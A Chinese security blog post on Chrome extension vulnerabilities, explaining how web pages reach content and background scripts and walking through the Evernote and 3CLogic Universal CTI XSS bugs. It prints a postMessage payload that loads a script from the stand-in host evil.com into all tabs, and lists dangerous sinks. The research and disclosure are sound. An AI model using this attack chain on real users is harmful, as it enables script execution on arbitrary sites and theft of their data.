---
title: 从0开始入门Chrome Ext安全（三） -- 你所未知的角落 -  Chrome Ext安全
date: 2021-08-17 14:41:47
tags:
- chrome
- chrome ext
---

在2019年初，微软正式选择了Chromium作为默认浏览器，并放弃edge的发展。并在19年4月8日，Edge正式放出了基于Chromium开发的Edge Dev浏览器，并提供了兼容Chrome Ext的配套插件管理。再加上国内的大小国产浏览器大多都是基于Chromium开发的，Chrome的插件体系越来越影响着广大的人群。

在这种背景下，Chrome Ext的安全问题也应该受到应有的关注，《从0开始入门Chrome Ext安全》就会从最基础的插件开发开始，逐步研究插件本身的恶意安全问题，恶意网页如何利用插件漏洞攻击浏览器等各种视角下的安全问题。

- [从0开始入门Chrome Ext安全（一） -- 了解一个Chrome Ext](https://lorexxar.cn/2019/11/22/chrome-ext-1/)
- [从0开始入门Chrome Ext安全（二） -- 安全的Chrome Ext](https://lorexxar.cn/2019/12/05/chrome-ext-2/)

在经历了前两篇之后，我们把视角重新转换，把受害者的目标从使用插件者换到插件本身。对于Chrome ext本身来说，他会有什么样的问题呢？



PS: 当时这份研究是在2020年初做的，当时还在知道创宇的404实验室，感觉内容很有趣所以准备拿去当议题。2020年我想大家都懂的，很多会议都取消了，一拖就拖到2021年，本来打算拿去投KCON，但是没有通过。所以今天就整理整理发出来了~

<!--more-->

# 从一个真实事件开始

在evernote扩展中曾爆出过一个xss漏洞

- [Critical Vulnerability Discovered in Evernote’s Chrome Extension](https://guard.io/blog/evernote-universal-xss-vulnerability)

首先我们从manifest开始，存在问题的js是content js.

![image.png-17.1kB](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144441.png)

BrowserFrameLoader.js会被直接插入到http、https、ftp三个域内，由于all_frames，还会被直接插入到页面内的每一个iframe子框架下。

其中有这么一段代码比较关键

![image.png-27.8kB](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144504.png )

这段代码主要通过函数`_getBundleUrl`来生成要安装的js地址，而其中的e来自于resourcePath参数，这里本身应该通过传入形如`chrome-extension://...`这样的路径，以生成所需要的js路径。

![image-20210817150115998](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817150148.png)

可以看到`_getBundleUrl`中本身也没有验证，所以只要我们传入resourcePath为恶意地址，我们就可以通过这个功能把原本的js替换到，改为我们想要注册的js。

![image.png-25.4kB](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144550.png )

我们可以直接通过window.postMessage与后端沟通，传递消息。

再配合manifest中的all_frames，我们可以通过在某个页面中构造一个隐藏的iframe标签，其中使用window.postMessage传递恶意地址，导致其他页面引入恶意的js。

![image.png-81.1kB](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144635.png )

这样一来，如果带有这个插件的浏览者访问某个页面时，就会直接被大范围的攻击，那么这个漏洞的具体原理是什么样的呢？



# 浏览器插件安全逻辑

在研究插件的漏洞之前，首先我们需要从插件的结构和可以攻击的方式来思考。

[从0开始入门Chrome Ext安全（一） -- 了解一个Chrome Ext](https://lorexxar.cn/2019/11/22/chrome-ext-1/)

在第一篇文章中，我们曾详细的描述过和chrome有关的诸多信息，其中有很重要的一部分是插件不同层级之间的通信方式，我们把这个结构画出来大概是这样的:

![image-20210817150301320](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817154421.png)

首先我们把插件的结构体系分为三级，分别是Web层、content层、bg层。

其中插件的**web层**主要是`injected script`，在这部分中，主要漏洞就围绕js本身，原理上和普通的js漏洞没什么区别，这里就不深入讨论。

而**content层**中，这部分和Web层主要的区别是它可以访问很小一部分chrome api，其中最重要的是，它可以和bg层进行沟通。抛开本身js漏洞不谈，content层最大的特殊就在于它是一个中转层，只有content构造的`chrome.runtime.sendMessage`可以向后端传递数据。

在**bg层**中，就涉及到了许多的敏感操作了，一旦可以控制bg层中的代码执行，我们几乎相当于控制了整个浏览器，但其中最大的限制仍然是，我们没办法直接操作bg层，浏览器想要操作bg层，就必须通过content层来中转。

| -         | js执行                                   | 可控点                                        |
| --------- | ---------------------------------------- | --------------------------------------------- |
| web层     | 和普通js没有区别                         |                                               |
| content层 | 除了普通js以外只能访问runtime等少部分api | 只能通过addEventListener或获取dom输入         |
| bg层      | 可以访问大部分api，但不能访问页面dom     | 只能通过runtime.onmessage.addListener获取输入 |

当我们在了解了chrome插件结构之后，不难发现，**当我们想要利用一个插件漏洞时，首先我们必须从可控出发.**

当我们可以控制某个敏感操作的一部分时，我们就有可能构造一次利用，一次完整的利用链就构造成功了。

而对于浏览器来说，符合正常人的逻辑的交互逻辑即为访问某个链接，或者访问某个页面。

**建立在这个基础上，通过构造恶意网页、链接，诱导受害人点击，从而开始进行一系列攻击行为则是对于插件安全漏洞的正确利用方向。**

而通过访问某个恶意页面配合插件的某个漏洞攻击，只有两个维度可以供我们攻击，在这里我们把这两种攻击方式分为两个维度，**基于Content层的安全问题**和**基于bg层的安全问题**。

在下面我们就将围绕这两个维度来讲述。

# 基于content script的安全问题

在前面的篇幅中我曾详述过content script的相关信息，content script会把相应的js插入到符合条件的所有页面中，而这个条件会在manifest中被定义。

```
{
  "name": "My extension",
  ...
  "content_scripts": [
    {
      "matches": ["http://*.nytimes.com/*"],
      "exclude_matches": ["*://*/*business*"],
      "include_globs": ["*nytimes.com/???s/*"],
      "exclude_globs": ["*science*"],
      "all_frames": true,
      "js": ["contentScript.js"],
      "run_at": "document_idle"
    }
  ],
  ...
}
```

其中几个参顺相对应的配置为：
- matches: 匹配生效的域
- exclued_matches: 不匹配生效的域
- include_globs: 在前两项匹配之后生效的匹配关键字
- exclude_globs: 在前两项匹配之后生效的排除关键字
- all_frames: content script是否会插入到页面的iframe标签中
- run_at: 指content script插入的时机

Content层和Web层是通过**事件监听**的方式沟通的：

![image-20210817150722902](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817150724.png)

这样一来，Content层的安全问题就有了几个绕不开的特点：

- 攻击者只能通过**window.postMessage**与后端沟通，传递消息。
- 如果只能触发Content Script的漏洞，那么只影响当前Web Page，与**XSS漏洞无异**。
- 如果开启了**all_frame**,配合**特殊场景**可以影响所有的子frame，就可以**定向攻击任何域**。

Content层面的的问题因为逃不开诸多的限制，所以危害比较有限，前面的evernote的漏洞已经是非常厉害的一个漏洞了。



- [Evernote Chrome ext XSS 演示 youtube版本](https://youtu.be/K6Oqb0hVT9k)



# 基于bg层的安全问题

![image-20210817165335661](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817165337.png)

与content层漏洞最大的区别就是，我们没办法**直接和bg/popup层交互**，除非本身的逻辑有安全问题。但如果能造成任意代码执行，可能可以**通过chrome API威胁整个浏览器的各个方面**。

那么这类漏洞的关键点就在于，**不管后端存不存在有问题的API，在content script层有可控的`chrome.tabs.sendMessage`信息向pop/popup script传输是这类漏洞首先必备的基础条件**。

### 中转函数

而在部分插件代码中，content script设置中转代码也并不罕见。**正所谓，上有对策，下有政策。为安全性考量的而设置的限制，也实实在在的影响到了原本的插件开发者。所以开发插件的开发者也通过自己的方式来构造直接传输的通道。**

在3CLogic Universal CTI插件中就有这样的一段代码
```
window.addEventListener("message", function (event) {
    try {
        // Accept messages from this window only
        if (typeof (event.data) !== "string") return;
        // Send convert string back to object for passing it to the extension
        const data = JSON.parse(event.data);
        // adding cccce so that this message doesn't mix with messages from other windows
        if (data.method && data.method !== "onCTIAdapterMessage") {
            data.method = `ccce${data.method}`;
        } else {
            ccclogger.log(`Got Adaptor Message`);
        }
        window.chrome.extension.sendMessage(data,
            function (response) {
                ccclogger.log(response);
            });
    } catch (e) {
        ccclogger.warn(e, e.stack);
    }
});

```

这段代码会把接收到的消息通过`window.chrome.extension.sendMessage`转发出去。

通过这样的代码我们就可以直接和popup/bg 层沟通，也代表我们有**一定的可能**构造一个利用。

### 恶意函数

反之，我们也可以从利用的角度思考，popup/bg script没办法直接和页面沟通，换言之，也就是说如果在popup/bg script中存在可以被利用的点，一定是来源于相应的恶意函数。

而其中相应的恶意函数只有几个，分别是：
```
chrome.tabs.executeScript
chrome.tabs.update

eval
setTimeout
```

**executeScript**可以在任意页面执行代码，而**update函数**可以更新页面中的信息，包括url等，**eval和setTimeout可以执行插件代码**，但也同样会被可能会受到CSP的限制。

从利用的角度来讲，只有popup/bg script存在这样的函数，并且参数可控，那么才有可能诞生一个漏洞。

### 举个栗子 - 3CLogic Universal CTI XSS

首先根据manifest的内容可以知道，这个插件可以通过构造的方式生效在任意域下。

![image-20210817171905056](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817171906.png)

Content层也存在可控的中转函数

![image-20210817173049880](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173051.png)

Bg层接收到消息之后，触发processMessage函数

![image-20210817173424538](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173426.png)

processMessage函数根据传入的操作类型转到相应的接口。其中就包含可以给任意tag插入js的sendInjectEvent函数

![image-20210817173539993](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173541.png)

sendInjectEvent会将传入的参数拼接到函数内，并通过创建标签的方式为指定的tag新建标签。

![image-20210817173656585](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173658.png)

整个利用链被链接起来，简化为：

1、构造恶意页面在`“*://*/*3cphone.html*”`，受害者访问该页面/将链接植入到某个点击劫持/URL跳转/。
2、打开其他目标页面如微博、twitter等。
3、恶意页面发送

```
window.postMessage(JSON.stringify({
	“method”: “OnInjectScript”,
	“forSite”: “.”, 
	“selectedLibs": [
		https://evil.com/evil.js
	]}), "*")
```

4、恶意JS被插入到所有的tag中，我们就可以在任意目标域执行JS，如获取微博消息等。



- [3CL Chrome ext XSS 演示 youtube版本](https://youtu.be/t4HG7K_JIVg)



## 写在最后

其实可以把整个漏洞分成两部分，寻找中转函数和寻找恶意函数，如果找到满足两个同时条件的情况，再辅以一些人工基本上就能找到一个漏洞。当时也是把这个思路贯彻到KunLun-M上，我会利用工具寻找两个条件的代码，然后做人工审计，当时还是发现了一些漏洞的，后来觉得挖掘需要一定的成本，而且我也没打算拿来作恶，所以这些漏洞也就用不太上，于是后来打算拿出来当议题。（3CL这个漏洞是我挖掘的通用性最高的，同时危害也不算太大）

当时这份研究是在2020年初做的，当时还在知道创宇的404实验室，感觉内容很有趣所以准备拿去当议题。2020年我想大家都懂的，很多会议都取消了，一拖就拖到2021年，本来打算拿去投KCON，但是没有通过。有趣的是在DEFCON2021的一个议题中，提到了差不多的内容。

[Barak Sternberg - Extension-Land - exploits and rootkits in your browser extensions](https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Barak%20Sternberg%20-%20Extension-Land%20-%20%20exploits%20and%20rootkits%20in%20your%20browser%20extensions.pdf)

除了我的部分内容以外呢，他还提了几个不算太常见的攻击场景，感兴趣可以去看看（但我感觉他把一个简单的东西讲复杂了，这违背了的行文意愿）。因为这个我也没兴趣继续保留这份成果了，今天也公开出来，其中可能有很多老的东西。但是其实也很少有系统的分享插件安全思路的文章，希望这篇文章可以给你带来收获。
